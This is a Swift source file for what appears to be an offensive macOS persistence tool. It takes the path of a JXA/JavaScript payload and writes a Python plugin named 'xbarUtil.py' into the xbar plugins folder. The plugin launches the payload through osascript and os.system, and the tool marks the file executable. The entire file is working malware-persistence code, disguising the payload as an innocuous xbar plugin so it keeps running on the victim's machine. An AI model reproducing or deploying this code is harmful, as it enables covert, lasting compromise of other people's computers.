import Foundation
import Cocoa

//Usage: ./xbarPluginPersistence [path_to_js_jxa_app]

let scriptName = CommandLine.arguments[0]
let fileMan = FileManager.default
let uName = NSUserName()
let home = "/Users/\(uName)"
var isDir = ObjCBool(true)

if CommandLine.arguments.count != 2 {
    print("Usage: \(scriptName) [jxa_js_payload]")
    print("exiting...")
    exit(0)
}
else {
    let payload = CommandLine.arguments[1]
    let osapayload = "osascript \(payload) &"
    if fileMan.fileExists(atPath: payload){
        var xbarPluginpath = "\(home)/Library/Application Support/xbar/plugins/xbarUtil.py"
        var xbarPath = "\(home)/Library/Application Support/xbar/plugins"
        if !(fileMan.fileExists(atPath: xbarPath)){
            print("[-] xbar not installed on this host. Exiting...")
            exit(0)
        }
        else {
            do {
                var commandTemplate =
                """
                #!/usr/bin/python
                import os
                os.system("templateCommand")
                """
                
                var newCommand = commandTemplate.replacingOccurrences(of: "templateCommand", with: osapayload)
                try newCommand.write(toFile: xbarPluginpath, atomically: false, encoding: .utf8)
                var attributes = [FileAttributeKey : Any]()
                attributes[.posixPermissions] = 0o755
                try fileMan.setAttributes(attributes, ofItemAtPath: xbarPluginpath)
                print("[+] xbar python plugin script created at \(xbarPluginpath) for persistence")
                
            }
            catch let error {
                print(error)
            }
  
        }
        
        
    }
    else {
        print("[-] Payload \(payload) not found. Exiting...")
        exit(0)
    }
    
}
